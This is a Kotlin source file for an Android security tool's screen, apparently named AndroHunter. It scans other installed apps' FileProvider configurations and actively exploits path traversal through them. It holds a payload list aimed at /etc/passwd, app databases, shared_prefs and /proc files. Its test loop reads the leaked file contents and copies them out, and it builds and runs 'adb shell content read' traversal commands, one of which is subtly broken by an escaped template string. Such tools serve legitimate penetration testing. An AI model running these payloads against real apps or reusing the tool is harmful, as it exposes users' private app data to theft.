package com.androhunter.app.ui.fileprovider

import android.content.pm.PackageManager
import android.net.Uri
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.imePadding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.androhunter.app.ui.common.HunterTopBar
import com.androhunter.app.ui.theme.*
import kotlinx.coroutines.*
import org.xmlpull.v1.XmlPullParser
import java.io.File
import java.util.zip.ZipFile

// ── Sabit renkler (copy() ambiguity yok) ──────────────────
private val RedBg      = Color(0x0DFF4444)
private val RedBorder  = Color(0x66FF4444)
private val RedBadge   = Color(0x26FF4444)
private val YellowBg   = Color(0x0DFFAA00)
private val YellowBorder = Color(0x55FFAA00)
private val YellowBadge  = Color(0x22FFAA00)
private val GreenBg    = Color(0x1A00FF88)
private val GreenBorder= Color(0x7700FF88)
private val BlueBg     = Color(0x1558A6FF)
private val BlueBorder = Color(0x5558A6FF)
private val DimBg      = Color(0x22808080)

data class FileProviderInfo(
    val authority: String,
    val exported: Boolean,
    val grantUriPermissions: Boolean,
    val paths: List<ProviderPath>
)

data class ProviderPath(
    val type: String,   // files-path, cache-path, external-path, root-path, etc.
    val name: String,
    val path: String,
    val resolvedPath: String,
    val risk: String    // CRITICAL / HIGH / MEDIUM / LOW
)

data class TraversalResult(
    val path: String,
    val payload: String,
    val uri: String,
    val status: String,
    val output: String
)

private val TRAVERSAL_PAYLOADS = listOf(
    "../" to "1 level up",
    "../../" to "2 levels up",
    "../../../" to "3 levels up",
    "../../../../etc/passwd" to "Read /etc/passwd",
    "../../../../data/data/TARGET/databases/" to "DB directory",
    "../../../../data/data/TARGET/shared_prefs/" to "SharedPrefs",
    "../../../../proc/self/cmdline" to "Process cmdline",
    "%2e%2e%2f%2e%2e%2f" to "URL encoded traversal",
    "..%2F..%2F" to "Mixed encoding",
)

private fun assessRisk(type: String, path: String): String {
    if (type == "root-path") return "CRITICAL"
    if (path.isBlank() || path == ".") return "CRITICAL"
    if (type == "external-path" && (path.isBlank() || path == ".")) return "HIGH"
    if (path.contains("..")) return "CRITICAL"
    if (type in listOf("cache-path", "external-cache-path")) return "MEDIUM"
    return "LOW"
}

private fun resolveRealPath(context: android.content.Context, type: String, path: String, pkg: String): String {
    return try {
        when (type) {
            "files-path"          -> "${context.filesDir}/$path"
            "cache-path"          -> "${context.cacheDir}/$path"
            "external-path"       -> "${android.os.Environment.getExternalStorageDirectory()}/$path"
            "external-files-path" -> "${context.getExternalFilesDir(null)}/$path"
            "external-cache-path" -> "${context.externalCacheDir}/$path"
            "root-path"           -> "/$path"
            else                  -> "/data/data/$pkg/$path"
        }
    } catch (e: Exception) { "?" }
}

@Composable
fun FileProviderScreen(packageName: String, onBack: () -> Unit) {
    val context   = LocalContext.current
    val clipboard = LocalClipboardManager.current
    val scope     = rememberCoroutineScope()

    var providers    by remember { mutableStateOf<List<FileProviderInfo>>(emptyList()) }
    var loading      by remember { mutableStateOf(true) }
    var activeTab    by remember { mutableStateOf(0) }
    var selectedProv by remember { mutableStateOf<FileProviderInfo?>(null) }
    var testResults  = remember { mutableStateListOf<TraversalResult>() }
    var testing      by remember { mutableStateOf(false) }
    var testProgress by remember { mutableStateOf("") }
    var customPath   by remember { mutableStateOf("") }

    // ── Parse FileProvider paths from APK ─────────────────
    LaunchedEffect(packageName) {
        withContext(Dispatchers.IO) {
            val found = mutableListOf<FileProviderInfo>()
            try {
                val pkgInfo = context.packageManager.getPackageInfo(
                    packageName, PackageManager.GET_PROVIDERS
                )
                pkgInfo.providers?.filter {
                    it.authority != null &&
                    (it.name.contains("FileProvider", ignoreCase = true) ||
                     it.name.contains("fileprovider", ignoreCase = true) ||
                     it.name.contains("androidx.core"))
                }?.forEach { prov ->
                    // APK'dan XML'i çıkar
                    val paths = mutableListOf<ProviderPath>()
                    try {
                        val srcDir = context.packageManager.getApplicationInfo(packageName, 0).sourceDir
                        val zip    = ZipFile(srcDir)
                        // res/xml/ altındaki tüm dosyaları tara
                        zip.entries().toList()
                            .filter { it.name.startsWith("res/xml/") && it.name.endsWith(".xml") }
                            .forEach { entry ->
                                val xml = zip.getInputStream(entry).bufferedReader().readText()
                                if (xml.contains("path") && (xml.contains("files-path") ||
                                    xml.contains("cache-path") || xml.contains("external") ||
                                    xml.contains("root-path"))) {
                                    // XmlPullParser ile parse et
                                    val parser = android.util.Xml.newPullParser()
                                    parser.setInput(zip.getInputStream(zip.getEntry(entry.name)), "UTF-8")
                                    var event = parser.eventType
                                    while (event != XmlPullParser.END_DOCUMENT) {
                                        if (event == XmlPullParser.START_TAG) {
                                            val tag  = parser.name ?: ""
                                            val validTags = listOf("files-path","cache-path","external-path",
                                                "external-files-path","external-cache-path","root-path")
                                            if (tag in validTags) {
                                                val name = parser.getAttributeValue(null,"name") ?: ""
                                                val path = parser.getAttributeValue(null,"path") ?: ""
                                                val risk = assessRisk(tag, path)
                                                val real = resolveRealPath(context, tag, path, packageName)
                                                paths.add(ProviderPath(tag, name, path, real, risk))
                                            }
                                        }
                                        event = parser.next()
                                    }
                                }
                            }
                        zip.close()
                    } catch (e: Exception) {
                        paths.add(ProviderPath("parse-error", "", e.message?.take(60) ?: "", "", "LOW"))
                    }

                    found.add(FileProviderInfo(
                        authority          = prov.authority ?: packageName,
                        exported           = prov.exported,
                        grantUriPermissions = (prov.flags and 0x10) != 0,
                        paths              = paths
                    ))
                }

                // FileProvider bulunamazsa tüm provider'ları göster
                if (found.isEmpty()) {
                    pkgInfo.providers?.forEach { prov ->
                        found.add(FileProviderInfo(
                            authority           = prov.authority ?: "",
                            exported            = prov.exported,
                            grantUriPermissions = false,
                            paths               = emptyList()
                        ))
                    }
                }
            } catch (e: Exception) {
                found.add(FileProviderInfo("Hata: ${e.message?.take(80)}", false, false, emptyList()))
            }
            withContext(Dispatchers.Main) {
                providers = found
                selectedProv = found.firstOrNull()
                loading = false
            }
        }
    }

    // ── Path traversal testi ──────────────────────────────
    fun runTraversalTest(prov: FileProviderInfo, basePath: ProviderPath) {
        testing = true; testResults.clear()
        scope.launch(Dispatchers.IO) {
            val payloads = TRAVERSAL_PAYLOADS.map { (p, d) ->
                p.replace("TARGET", packageName) to d
            } + if (customPath.isNotBlank()) listOf(customPath to "Custom") else emptyList()

            payloads.forEach { (payload, desc) ->
                withContext(Dispatchers.Main) { testProgress = "Test: $payload" }
                try {
                    val uriStr = "content://${prov.authority}/${basePath.name}/$payload"
                    val uri    = Uri.parse(uriStr)
                    val cursor = context.contentResolver.query(uri, null, null, null, null)
                    val output = if (cursor != null) {
                        val sb = StringBuilder()
                        while (cursor.moveToNext()) {
                            (0 until cursor.columnCount).forEach { i ->
                                sb.append("${cursor.getColumnName(i)}=${cursor.getString(i)} ")
                            }
                        }
                        cursor.close()
                        sb.toString().ifBlank { "cursor boş" }
                    } else "(null)"

                    // Dosya okuma dene
                    val fileOutput = try {
                        val pfd = context.contentResolver.openFileDescriptor(uri, "r")
                        if (pfd != null) {
                            val stream = java.io.FileInputStream(pfd.fileDescriptor)
                            val content = stream.bufferedReader().readText().take(200)
                            pfd.close()
                            content
                        } else "(null pfd)"
                    } catch (e: Exception) { e.message?.take(80) ?: "ERR" }

                    val isVuln = !fileOutput.contains("Permission") &&
                                 !fileOutput.contains("null") &&
                                 fileOutput.length > 5 &&
                                 !fileOutput.startsWith("ERR")

                    withContext(Dispatchers.Main) {
                        testResults.add(TraversalResult(
                            path    = desc,
                            payload = payload,
                            uri     = uriStr,
                            status  = if (isVuln) "VULN" else "SAFE",
                            output  = fileOutput.ifBlank { output }
                        ))
                    }
                } catch (e: Exception) {
                    withContext(Dispatchers.Main) {
                        testResults.add(TraversalResult(
                            path    = desc,
                            payload = payload,
                            uri     = "content://${prov.authority}/${basePath.name}/$payload",
                            status  = "ERR",
                            output  = e.message?.take(80) ?: ""
                        ))
                    }
                }
                delay(100)
            }
            withContext(Dispatchers.Main) { testing = false; testProgress = "" }
        }
    }

    val vulnCount = testResults.count { it.status == "VULN" }
    val critPaths = providers.flatMap { it.paths }.count { it.risk == "CRITICAL" }

    Column(Modifier.fillMaxSize().background(HunterBg).imePadding().navigationBarsPadding()) {
        HunterTopBar("FILE PROVIDERS", onBack)

        if (loading) {
            Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    CircularProgressIndicator(color = HunterGreen, strokeWidth = 2.dp)
                    Spacer(Modifier.height(8.dp))
                    Text("FileProvider analiz ediliyor...", color = HunterTextDim,
                        fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                }
            }
            return@Column
        }

        // Stats bar
        Row(
            Modifier.fillMaxWidth().background(HunterCard).padding(10.dp),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            Surface(color = RedBadge, shape = RoundedCornerShape(4.dp)) {
                Text("CRIT $critPaths", color = HunterRed, fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold, fontSize = 10.sp,
                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
            }
            Surface(color = DimBg, shape = RoundedCornerShape(4.dp)) {
                Text("${providers.size} PROVIDER", color = HunterTextDim,
                    fontFamily = FontFamily.Monospace, fontSize = 10.sp,
                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
            }
            if (vulnCount > 0) Surface(color = RedBadge, shape = RoundedCornerShape(4.dp)) {
                Text("⚡ $vulnCount VULN", color = HunterRed, fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold, fontSize = 10.sp,
                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
            }
        }

        TabRow(selectedTabIndex = activeTab, containerColor = HunterCard, contentColor = HunterGreen) {
            listOf("Paths", "Traversal Test", "ADB Komutları").forEachIndexed { i, t ->
                Tab(selected = activeTab == i, onClick = { activeTab = i }) {
                    Text(t, fontFamily = FontFamily.Monospace, fontSize = 11.sp,
                        color = if (activeTab == i) HunterGreen else HunterTextDim,
                        modifier = Modifier.padding(vertical = 10.dp))
                }
            }
        }

        when (activeTab) {
            // ── TAB 0: Path listesi ───────────────────────
            0 -> LazyColumn(contentPadding = PaddingValues(12.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)) {
                providers.forEach { prov ->
                    item {
                        Column(
                            Modifier.fillMaxWidth()
                                .background(HunterCard, RoundedCornerShape(8.dp))
                                .border(1.dp,
                                    if (prov.exported) RedBorder else HunterBorder,
                                    RoundedCornerShape(8.dp))
                                .padding(12.dp),
                            verticalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // Provider header
                            Row(horizontalArrangement = Arrangement.spacedBy(6.dp),
                                verticalAlignment = Alignment.CenterVertically) {
                                if (prov.exported) Surface(color = RedBadge, shape = RoundedCornerShape(3.dp)) {
                                    Text("EXPORTED", color = HunterRed, fontFamily = FontFamily.Monospace,
                                        fontWeight = FontWeight.Bold, fontSize = 8.sp,
                                        modifier = Modifier.padding(horizontal = 5.dp, vertical = 2.dp))
                                }
                                if (prov.grantUriPermissions) Surface(color = YellowBadge, shape = RoundedCornerShape(3.dp)) {
                                    Text("GRANT-URI", color = HunterYellow, fontFamily = FontFamily.Monospace,
                                        fontWeight = FontWeight.Bold, fontSize = 8.sp,
                                        modifier = Modifier.padding(horizontal = 5.dp, vertical = 2.dp))
                                }
                            }
                            Text(prov.authority, color = HunterGreen, fontFamily = FontFamily.Monospace,
                                fontWeight = FontWeight.Bold, fontSize = 12.sp)

                            if (prov.paths.isEmpty()) {
                                Text("Path XML bulunamadı — APK şifreli olabilir",
                                    color = HunterYellow, fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                            } else {
                                prov.paths.forEach { p ->
                                    val riskColor = when (p.risk) {
                                        "CRITICAL" -> HunterRed; "HIGH" -> HunterYellow
                                        "MEDIUM"   -> HunterBlue; else  -> HunterTextDim
                                    }
                                    val riskBg = when (p.risk) {
                                        "CRITICAL" -> RedBg; "HIGH" -> YellowBg
                                        "MEDIUM"   -> BlueBg; else  -> DimBg
                                    }
                                    val riskBorder = when (p.risk) {
                                        "CRITICAL" -> RedBorder; "HIGH" -> YellowBorder
                                        "MEDIUM"   -> BlueBorder; else  -> HunterBorder
                                    }
                                    Column(
                                        Modifier.fillMaxWidth()
                                            .background(riskBg, RoundedCornerShape(6.dp))
                                            .border(1.dp, riskBorder, RoundedCornerShape(6.dp))
                                            .padding(8.dp)
                                    ) {
                                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp),
                                            verticalAlignment = Alignment.CenterVertically) {
                                            Surface(color = riskBorder, shape = RoundedCornerShape(3.dp)) {
                                                Text(p.risk, color = riskColor,
                                                    fontFamily = FontFamily.Monospace,
                                                    fontWeight = FontWeight.Bold, fontSize = 8.sp,
                                                    modifier = Modifier.padding(horizontal = 5.dp, vertical = 2.dp))
                                            }
                                            Surface(color = DimBg, shape = RoundedCornerShape(3.dp)) {
                                                Text(p.type, color = HunterTextDim,
                                                    fontFamily = FontFamily.Monospace, fontSize = 8.sp,
                                                    modifier = Modifier.padding(horizontal = 4.dp, vertical = 2.dp))
                                            }
                                        }
                                        Spacer(Modifier.height(4.dp))
                                        Text("name: ${p.name}", color = riskColor,
                                            fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 11.sp)
                                        Text("path: ${p.path.ifBlank { "(boş = ROOT erişim!)" }}",
                                            color = if (p.path.isBlank()) HunterRed else riskColor,
                                            fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                                        Text("→ ${p.resolvedPath}", color = HunterTextDim,
                                            fontFamily = FontFamily.Monospace, fontSize = 10.sp)
                                        if (p.risk in listOf("CRITICAL","HIGH")) {
                                            Spacer(Modifier.height(4.dp))
                                            val warn = when {
                                                p.path.isBlank() && p.type == "root-path" -> "⚠ Tüm dosya sistemine erişim!"
                                                p.path.isBlank() -> "⚠ ${p.type} root'a erişim!"
                                                p.type == "external-path" -> "⚠ SD kart tam erişim"
                                                else -> "⚠ Path traversal riski yüksek"
                                            }
                                            Text(warn, color = HunterRed,
                                                fontFamily = FontFamily.Monospace,
                                                fontWeight = FontWeight.Bold, fontSize = 10.sp)
                                        }
                                    }
                                    Spacer(Modifier.height(4.dp))
                                }
                            }
                        }
                    }
                }
            }

            // ── TAB 1: Traversal Test ─────────────────────
            1 -> Column(Modifier.fillMaxSize()) {
                Column(Modifier.padding(12.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    // Provider seç
                    Text("PROVIDER SEÇ", color = HunterTextDim,
                        fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                    providers.forEach { prov ->
                        val isSel = selectedProv == prov
                        Row(
                            Modifier.fillMaxWidth()
                                .background(if (isSel) GreenBg else HunterCard, RoundedCornerShape(4.dp))
                                .border(1.dp, if (isSel) GreenBorder else HunterBorder, RoundedCornerShape(4.dp))
                                .clickable(indication = null,
                                    interactionSource = remember { MutableInteractionSource() }) {
                                    selectedProv = prov
                                }
                                .padding(10.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(prov.authority, color = if (isSel) HunterGreen else HunterText,
                                fontFamily = FontFamily.Monospace, fontSize = 11.sp, modifier = Modifier.weight(1f))
                            RadioButton(selected = isSel, onClick = { selectedProv = prov },
                                colors = RadioButtonDefaults.colors(selectedColor = HunterGreen))
                        }
                    }

                    OutlinedTextField(
                        value = customPath, onValueChange = { customPath = it },
                        label = { Text("Custom payload (opsiyonel)", fontFamily = FontFamily.Monospace, fontSize = 11.sp) },
                        placeholder = { Text("../../../../etc/hosts", color = HunterTextDim,
                            fontFamily = FontFamily.Monospace, fontSize = 11.sp) },
                        modifier = Modifier.fillMaxWidth(), singleLine = true,
                        textStyle = TextStyle(color = HunterGreen, fontFamily = FontFamily.Monospace),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = HunterGreen, unfocusedBorderColor = HunterBorder,
                            focusedLabelColor = HunterGreen, unfocusedLabelColor = HunterTextDim)
                    )

                    Button(
                        onClick = {
                            selectedProv?.let { prov ->
                                val path = prov.paths.firstOrNull()
                                    ?: ProviderPath("files-path", "files", "", "", "LOW")
                                runTraversalTest(prov, path)
                            }
                        },
                        enabled = selectedProv != null && !testing,
                        modifier = Modifier.fillMaxWidth().height(44.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = RedBg),
                        shape = RoundedCornerShape(4.dp),
                        border = androidx.compose.foundation.BorderStroke(1.dp, RedBorder)
                    ) {
                        if (testing) {
                            CircularProgressIndicator(color = HunterRed, strokeWidth = 2.dp,
                                modifier = Modifier.size(16.dp))
                            Spacer(Modifier.width(8.dp))
                            Text(testProgress.take(30), color = HunterRed,
                                fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                        } else {
                            Text("[ PATH TRAVERSAL TESTI BAŞLAT ]", color = HunterRed,
                                fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                    }
                }

                if (testResults.isNotEmpty()) {
                    HorizontalDivider(color = HunterBorder)
                    LazyColumn(contentPadding = PaddingValues(12.dp),
                        verticalArrangement = Arrangement.spacedBy(6.dp)) {
                        item {
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp),
                                verticalAlignment = Alignment.CenterVertically) {
                                Surface(color = RedBadge, shape = RoundedCornerShape(4.dp)) {
                                    Text("⚡ $vulnCount VULN", color = HunterRed,
                                        fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 10.sp,
                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
                                }
                                TextButton(onClick = {
                                    clipboard.setText(AnnotatedString(
                                        testResults.filter { it.status == "VULN" }
                                            .joinToString("\n") { "URI: ${it.uri}\nOutput: ${it.output}" }
                                    ))
                                }) {
                                    Text("VULN'ları Kopyala", color = HunterBlue,
                                        fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                                }
                            }
                        }
                        items(testResults) { r ->
                            val color = when (r.status) {
                                "VULN" -> HunterRed; "SAFE" -> HunterTextDim; else -> HunterYellow
                            }
                            val bg = when (r.status) {
                                "VULN" -> RedBg; else -> HunterCard
                            }
                            val border = when (r.status) {
                                "VULN" -> RedBorder; else -> HunterBorder
                            }
                            Column(
                                Modifier.fillMaxWidth()
                                    .background(bg, RoundedCornerShape(6.dp))
                                    .border(1.dp, border, RoundedCornerShape(6.dp))
                                    .padding(10.dp)
                            ) {
                                Row(verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                    Text(if (r.status == "VULN") "⚡" else "●",
                                        color = color, fontSize = 14.sp)
                                    Surface(color = border, shape = RoundedCornerShape(3.dp)) {
                                        Text(r.status, color = color, fontFamily = FontFamily.Monospace,
                                            fontWeight = FontWeight.Bold, fontSize = 8.sp,
                                            modifier = Modifier.padding(horizontal = 5.dp, vertical = 2.dp))
                                    }
                                    Text(r.path, color = HunterTextDim,
                                        fontFamily = FontFamily.Monospace, fontSize = 10.sp)
                                    Spacer(Modifier.weight(1f))
                                    if (r.status == "VULN")
                                        IconButton(onClick = { clipboard.setText(AnnotatedString(r.uri)) },
                                            modifier = Modifier.size(20.dp)) {
                                            Text("⎘", color = HunterTextDim, fontSize = 14.sp)
                                        }
                                }
                                Spacer(Modifier.height(3.dp))
                                Text(r.payload, color = color,
                                    fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                                Text(r.uri, color = HunterTextDim,
                                    fontFamily = FontFamily.Monospace, fontSize = 9.sp)
                                if (r.status == "VULN") {
                                    Spacer(Modifier.height(4.dp))
                                    Text(r.output, color = HunterGreen,
                                        fontFamily = FontFamily.Monospace, fontSize = 10.sp)
                                }
                            }
                        }
                    }
                }
            }

            // ── TAB 2: ADB Komutları ──────────────────────
            2 -> LazyColumn(contentPadding = PaddingValues(12.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)) {
                providers.forEach { prov ->
                    item {
                        val pathName = prov.paths.firstOrNull()?.name ?: "files"
                        val cmds = listOf(
                            "content://\${prov.authority}/$pathName/../../../" to "Temel traversal",
                            "content://\${prov.authority}/$pathName/../../../../data/data/$packageName/databases/" to "Database dizini",
                            "content://\${prov.authority}/$pathName/../../../../data/data/$packageName/shared_prefs/" to "SharedPrefs dizini",
                            "content://\${prov.authority}/$pathName/../../../../etc/passwd" to "Passwd dosyası",
                            "content://\${prov.authority}/$pathName/../../../../proc/self/maps" to "Process maps",
                        )
                        Column(
                            Modifier.fillMaxWidth()
                                .background(HunterCard, RoundedCornerShape(8.dp))
                                .border(1.dp, HunterBorder, RoundedCornerShape(8.dp))
                                .padding(12.dp),
                            verticalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Text(prov.authority, color = HunterGreen, fontFamily = FontFamily.Monospace,
                                fontWeight = FontWeight.Bold, fontSize = 12.sp)
                            cmds.forEach { (uri, desc) ->
                                val adb = "adb shell content read --uri '$uri'"
                                Column(
                                    Modifier.fillMaxWidth()
                                        .background(DimBg, RoundedCornerShape(4.dp))
                                        .border(1.dp, HunterBorder, RoundedCornerShape(4.dp))
                                        .padding(8.dp)
                                ) {
                                    Text(desc, color = HunterTextDim, fontFamily = FontFamily.Monospace, fontSize = 10.sp)
                                    Spacer(Modifier.height(3.dp))
                                    Text(adb, color = HunterGreen, fontFamily = FontFamily.Monospace, fontSize = 10.sp)
                                    Spacer(Modifier.height(4.dp))
                                    Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                        Button(
                                            onClick = { clipboard.setText(AnnotatedString(adb)) },
                                            modifier = Modifier.height(30.dp),
                                            colors = ButtonDefaults.buttonColors(containerColor = GreenBg),
                                            shape = RoundedCornerShape(4.dp),
                                            border = androidx.compose.foundation.BorderStroke(1.dp, GreenBorder),
                                            contentPadding = PaddingValues(horizontal = 10.dp)
                                        ) {
                                            Text("KOPYALA", color = HunterGreen,
                                                fontFamily = FontFamily.Monospace,
                                                fontWeight = FontWeight.Bold, fontSize = 10.sp)
                                        }
                                        Button(
                                            onClick = {
                                                try {
                                                    val proc = Runtime.getRuntime().exec(
                                                        arrayOf("sh","-c","content read --uri '$uri' 2>&1 | head -5"))
                                                    val out = proc.inputStream.bufferedReader().readText().take(100)
                                                    proc.waitFor()
                                                    clipboard.setText(AnnotatedString("CMD: $adb\nOUT: $out"))
                                                } catch (e: Exception) {}
                                            },
                                            modifier = Modifier.height(30.dp),
                                            colors = ButtonDefaults.buttonColors(containerColor = RedBg),
                                            shape = RoundedCornerShape(4.dp),
                                            border = androidx.compose.foundation.BorderStroke(1.dp, RedBorder),
                                            contentPadding = PaddingValues(horizontal = 10.dp)
                                        ) {
                                            Text("ÇALIŞTIR", color = HunterRed,
                                                fontFamily = FontFamily.Monospace,
                                                fontWeight = FontWeight.Bold, fontSize = 10.sp)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
